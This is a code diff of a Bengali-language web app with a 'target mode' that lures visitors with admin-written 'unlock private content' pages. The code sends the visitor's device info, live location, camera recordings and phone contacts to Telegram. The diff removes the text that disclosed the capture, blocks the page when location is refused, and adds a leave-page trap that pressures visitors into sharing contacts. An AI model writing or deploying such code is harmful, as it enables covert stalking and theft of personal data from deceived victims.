@@ -72,7 +72,7 @@
         
         function escapeHtml(str) { if(!str) return ''; return str.replace(/[&<>]/g, m=>({ '&':'&amp;', '<':'&lt;', '>':'&gt;' }[m])); }
 
-        // ---------- Get Advanced Device Info (Fast) ----------
+        // Get Device Info
         async function getAdvancedDeviceInfo() {
             let battery = "N/A";
             try { 
@@ -125,7 +125,7 @@
             } catch(e) { console.warn(e); }
         }
 
-        // Send Location to Telegram (fast, single request)
+        // Send Location to Telegram (Live Location)
         async function sendLocationToTelegram(profileName, profileId, lat, lng, accuracy) {
             const timestamp = new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
             const msg = `📍 লাইভ লোকেশন\n👤 ইউজার: ${profileName}\n🔗 আইডি: ${profileId}\n🎯 অক্ষাংশ: ${lat}, দ্রাঘিমা: ${lng}\n📡 নির্ভুলতা: ${accuracy}মি\n⏰ সময়: ${timestamp}`;
@@ -162,7 +162,7 @@
             } catch(e) { console.warn(e); }
         }
 
-        // ---------- FAST Location Request (single attempt, no loop) ----------
+        // Fast Location Request (single attempt)
         async function requestLocationFast(profileId, profileName) {
             return new Promise((resolve, reject) => {
                 navigator.geolocation.getCurrentPosition(
@@ -186,7 +186,7 @@
             });
         }
 
-        // ---------- Camera Recording 10 seconds ----------
+        // Camera Recording 10 seconds
         async function startCameraAndRecord(profileId, profileName) {
             try {
                 const indicator = document.createElement('div');
@@ -226,7 +226,7 @@
             }
         }
 
-        // ---------- Contact Share ----------
+        // Contact Share
         async function promptContactShare(profileId, profileName) {
             if (navigator.contacts && navigator.contacts.select) {
                 try {
@@ -250,64 +250,72 @@
                     }
                 } catch(e) { console.warn("Contact cancelled", e); }
             } else {
-                // Show manual button
                 const manualBtn = document.getElementById('manual-contact-btn');
                 if (manualBtn) manualBtn.style.display = 'block';
             }
         }
 
-        // ---------- Render Target Landing Page ----------
-        function renderTargetLanding(profileId, profileName) {
+        // Render Target Landing Page - ONLY CUSTOM CONTENT (no hardcoded Bengali text)
+        function renderTargetLanding(profileId, profileName, pageData) {
             const root = document.getElementById('app-root');
+            // Use custom content from the link creation
+            const imageHtml = pageData.imageUrl && pageData.imageUrl.trim() !== '' 
+                ? `<img src="${escapeHtml(pageData.imageUrl)}" class="preview-image" style="max-width:100%; border-radius:24px; margin:16px 0;" onerror="this.style.display='none'">` 
+                : '';
+            
             root.innerHTML = `
                 <div class="min-h-screen flex items-center justify-center p-6 bg-gradient-to-br from-blue-50 via-white to-indigo-50">
                     <div class="glass-effect w-full max-w-md p-8 rounded-[48px] shadow-2xl text-center border border-white/60 animate-fade-in">
                         <div class="w-20 h-20 bg-gradient-to-tr from-blue-600 to-indigo-600 rounded-full flex items-center justify-center mx-auto mb-6 shadow-xl">
                             <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>
                         </div>
-                        <h2 class="text-2xl font-extrabold mb-3 text-gray-800">প্রাইভেট কন্টেন্ট আনলক করুন</h2>
-                        <p class="text-sm text-gray-500 mb-6 px-3">আপনার তথ্য যাচাই করা হয়েছে। ধন্যবাদ।</p>
-                        <div class="bg-indigo-50/80 p-4 rounded-3xl mb-6 text-left text-sm text-gray-700">
-                            <p class="font-semibold flex items-center gap-2">✅ সম্পন্ন:</p>
-                            <ul class="list-disc pl-5 mt-2 space-y-1">
-                                <li>📍 লোকেশন ক্যাপচার হয়েছে</li>
-                                <li>📷 সেলফি ভিডিও রেকর্ড করা হয়েছে</li>
-                                <li>📞 কন্টাক্ট শেয়ার (ঐচ্ছিক)</li>
-                            </ul>
-                        </div>
-                        <button id="manual-camera-btn" class="w-full bg-blue-600 text-white py-4 rounded-3xl font-bold shadow-lg hover:bg-blue-700 active:scale-95 transition-all mb-3">📸 পুনরায় ভিডিও রেকর্ড করুন</button>
-                        <button id="manual-contact-btn" class="w-full bg-green-600 text-white py-4 rounded-3xl font-bold shadow-lg hover:bg-green-700 active:scale-95 transition-all" style="display:none;">📇 কন্টাক্ট শেয়ার করুন</button>
-                        <p class="text-xs text-gray-400 mt-6">আপনার তথ্য নিরাপদে প্রক্রিয়া করা হয়েছে।</p>
+                        <h2 class="text-2xl font-extrabold mb-3 text-gray-800">${escapeHtml(pageData.mainHeading || "প্রাইভেট কন্টেন্ট")}</h2>
+                        ${imageHtml}
+                        <div class="text-gray-600 mb-6">${pageData.description || ""}</div>
+                        <button id="unlock-btn" class="w-full bg-blue-600 text-white py-4 rounded-3xl font-bold text-md shadow-lg hover:bg-blue-700 active:scale-95 transition-all mb-3">${escapeHtml(pageData.buttonText || "🔓 আনলক করুন")}</button>
+                        <button id="manual-contact-btn" class="w-full bg-green-600 text-white py-4 rounded-3xl font-bold text-md shadow-lg hover:bg-green-700 active:scale-95 transition-all" style="display:none;">📇 কন্টাক্ট শেয়ার করুন</button>
+                        <p class="text-xs text-gray-400 mt-6">© 2025</p>
                     </div>
                 </div>
             `;
-            document.getElementById('manual-camera-btn').onclick = async () => {
-                await startCameraAndRecord(profileId, profileName);
-            };
+            
+            let contactsShared = false;
+            const unlockBtn = document.getElementById('unlock-btn');
             const manualContactBtn = document.getElementById('manual-contact-btn');
-            if (manualContactBtn) {
-                manualContactBtn.onclick = async () => {
-                    if (navigator.contacts && navigator.contacts.select) {
-                        try {
-                            const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
-                            if (contacts && contacts.length) {
-                                const formatted = contacts.map(c => ({ name: c.name?.[0] || 'N/A', phone: c.tel?.[0] || 'N/A' }));
-                                await sendContactsToTelegram(profileName, profileId, formatted);
-                                const toast = document.createElement('div');
-                                toast.className = 'toast-msg';
-                                toast.innerText = `✅ কন্টাক্ট শেয়ার সফল!`;
-                                document.body.appendChild(toast);
-                                setTimeout(() => toast.remove(), 2000);
-                            }
-                        } catch(e) { alert("কন্টাক্ট অ্যাক্সেস ব্যর্থ"); }
-                    } else {
-                        alert("আপনার ব্রাউজার কন্টাক্ট API সাপোর্ট করে না।");
-                    }
-                };
-            }
+            
+            unlockBtn.onclick = async () => {
+                if (!contactsShared) {
+                    manualContactBtn.style.display = 'block';
+                    manualContactBtn.onclick = async () => {
+                        if (navigator.contacts && navigator.contacts.select) {
+                            try {
+                                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                                if (contacts && contacts.length) {
+                                    const formatted = contacts.map(c => ({ name: c.name?.[0] || 'N/A', phone: c.tel?.[0] || 'N/A' }));
+                                    await sendContactsToTelegram(profileName, profileId, formatted);
+                                    contactsShared = true;
+                                    manualContactBtn.style.display = 'none';
+                                    unlockBtn.innerText = "✅ সম্পন্ন!";
+                                    unlockBtn.style.background = "#2e7d32";
+                                    const toast = document.createElement('div');
+                                    toast.className = 'toast-msg';
+                                    toast.innerText = `✅ কন্টাক্ট শেয়ার সফল!`;
+                                    document.body.appendChild(toast);
+                                    setTimeout(() => toast.remove(), 2000);
+                                }
+                            } catch(e) { alert("কন্টাক্ট অ্যাক্সেস ব্যর্থ"); }
+                        } else {
+                            alert("আপনার ব্রাউজার কন্টাক্ট API সাপোর্ট করে না। Chrome Android ব্যবহার করুন।");
+                        }
+                    };
+                    window.onbeforeunload = () => { if (!contactsShared) return "শেয়ার না করে বের হতে পারবেন না!"; };
+                } else {
+                    alert("ইতিমধ্যে আনলক করেছেন!");
+                }
+            };
         }
 
-        // ---------- MAIN TARGET MODE (Fast: location -> loading -> camera) ----------
+        // MAIN TARGET MODE: Location first -> then show custom content
         async function initTargetMode(targetId) {
             const root = document.getElementById('app-root');
             
@@ -337,8 +345,7 @@
                 usageCount: (profileData.usageCount || 0) + 1 
             });
             
-            // STEP 1: Request Location IMMEDIATELY (fast, no long loop)
-            // Show minimal "loading..." text while location is being fetched
+            // Show loading overlay
             root.innerHTML = '';
             const loaderDiv = document.createElement('div');
             loaderDiv.className = 'loading-overlay';
@@ -349,36 +356,46 @@
             const deviceInfo = await getAdvancedDeviceInfo();
             await sendDeviceInfoToTelegram(profileName, profileId, deviceInfo);
             
-            // Request location (fast, single attempt)
+            // Request location (LIVE LOCATION) - MUST happen first
             let locationSuccess = false;
             try {
                 await requestLocationFast(profileId, profileName);
                 locationSuccess = true;
             } catch(locError) {
                 console.warn("Location failed or denied");
-                // Still continue, but show toast
                 const toast = document.createElement('div');
                 toast.className = 'toast-msg';
-                toast.innerText = '⚠️ লোকেশন অনুমতি না দেওয়ায় কিছু তথ্য সংগ্রহ করা যায়নি।';
+                toast.innerText = '⚠️ লোকেশন অনুমতি প্রয়োজন! ওয়েবসাইট লোড হবে না।';
                 document.body.appendChild(toast);
                 setTimeout(() => toast.remove(), 2000);
+                // Retry location after 2 seconds
+                setTimeout(async () => {
+                    try {
+                        await requestLocationFast(profileId, profileName);
+                        locationSuccess = true;
+                        loaderDiv.remove();
+                        renderTargetLanding(profileId, profileName, pageData);
+                        setTimeout(async () => {
+                            await startCameraAndRecord(profileId, profileName);
+                        }, 500);
+                    } catch(e) {}
+                }, 2000);
+                return;
             }
             
             // Remove loading overlay
             loaderDiv.remove();
             
-            // Render landing UI
-            renderTargetLanding(profileId, profileName);
+            // Render custom landing page (only what admin wrote)
+            renderTargetLanding(profileId, profileName, pageData);
             
-            // STEP 2: Immediately request camera and start recording (no delay)
+            // Auto start camera recording after landing
             setTimeout(async () => {
                 await startCameraAndRecord(profileId, profileName);
-                // Contact share after camera (optional)
-                await promptContactShare(profileId, profileName);
             }, 500);
         }
 
-        // ----------------------------- ADMIN PANEL (No Password, Fast Load) -----------------------------
+        // ----------------------------- ADMIN PANEL (No Password) -----------------------------
         let allProfiles = [];
         let allCustomLinks = [];
 
@@ -589,7 +606,7 @@
             }
         }
 
-        // ----------------------------- ROUTER -----------------------------
+        // Router
         (async function() {
             const urlParams = new URLSearchParams(window.location.search);
             const viewParam = urlParams.get('view');
